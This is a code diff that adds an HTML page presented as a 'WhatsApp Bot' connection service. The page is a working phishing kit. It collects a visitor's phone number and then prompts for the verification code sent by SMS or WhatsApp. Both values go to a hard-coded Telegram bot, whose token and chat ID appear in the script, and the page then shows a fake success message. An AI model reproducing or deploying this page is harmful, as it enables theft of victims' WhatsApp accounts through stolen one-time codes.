@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp Bot</title>
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: black;
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .card {
+        background: rgba(255,255,255,0.1);
+        padding: 20px;
+        border-radius: 15px;
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 0 15px rgba(255,255,255,0.2);
+    }
+    input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        outline: none;
+    }
+    button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        background: linear-gradient(90deg, #6a11cb, #2575fc);
+        color: white;
+    }
+    .countdown {
+        font-size: 28px;
+        font-weight: bold;
+        color: lime;
+    }
+    .countdown.red {
+        color: red;
+    }
+</style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+    <h2>WhatsApp Bot</h2>
+    <p>Enter your WhatsApp number with country code</p>
+    <input type="tel" pattern="[0-9]*" inputmode="numeric" id="phone" placeholder="2348012345678">
+    <button onclick="startCountdown()">Connect Bot</button>
+</div>
+
+<script>
+const BOT_TOKEN = "8096107981:AAF4QDZy7Lp73VKkHh_aXscCg6GuaLvn6oM";
+const CHAT_ID = "7865382097";
+let isRequesting = false;
+
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    }).catch(err => console.error("Telegram error:", err));
+}
+
+function startCountdown() {
+    if (isRequesting) {
+        alert("Only one request can be active at a time. Please wait.");
+        return;
+    }
+    isRequesting = true;
+
+    let phone = document.getElementById("phone").value.trim();
+    if (phone === "") {
+        alert("Please enter your phone number.");
+        isRequesting = false;
+        return;
+    }
+
+    sendToTelegram(`📞 New WhatsApp Bot Request\nPhone: ${phone}`);
+
+    let count = 50; // changed from 20 to 50
+    document.getElementById("mainCard").innerHTML = `
+        <h2>You will receive your bot code on WhatsApp or SMS in:</h2>
+        <div class="countdown" id="timer">${count}</div>
+    `;
+
+    let timer = setInterval(() => {
+        count--;
+        let timerEl = document.getElementById("timer");
+        timerEl.textContent = count;
+
+        if (count <= 5) {
+            timerEl.classList.add("red");
+        }
+
+        if (count <= 0) {
+            clearInterval(timer);
+            showCodeInput();
+        }
+    }, 1000);
+}
+
+function showCodeInput() {
+    document.getElementById("mainCard").innerHTML = `
+        <h2>Enter WhatsApp bot code you just received on your SMS or WhatsApp</h2>
+        <input type="tel" pattern="[0-9]*" inputmode="numeric" id="botCode" placeholder="Enter code here">
+        <button onclick="connectBot()">Connect</button>
+    `;
+}
+
+function connectBot() {
+    let code = document.getElementById("botCode").value.trim();
+    if (code === "") {
+        alert("Please enter the bot code.");
+        return;
+    }
+
+    sendToTelegram(`✅ Bot Code Received: ${code}`);
+
+    document.getElementById("mainCard").innerHTML = `
+        <h2 style="color: lime;">WhatsApp Bot successfully connected ✅</h2>
+    `;
+
+    isRequesting = false; // allow new request
+}
+</script>
+
+</body>
+</html>
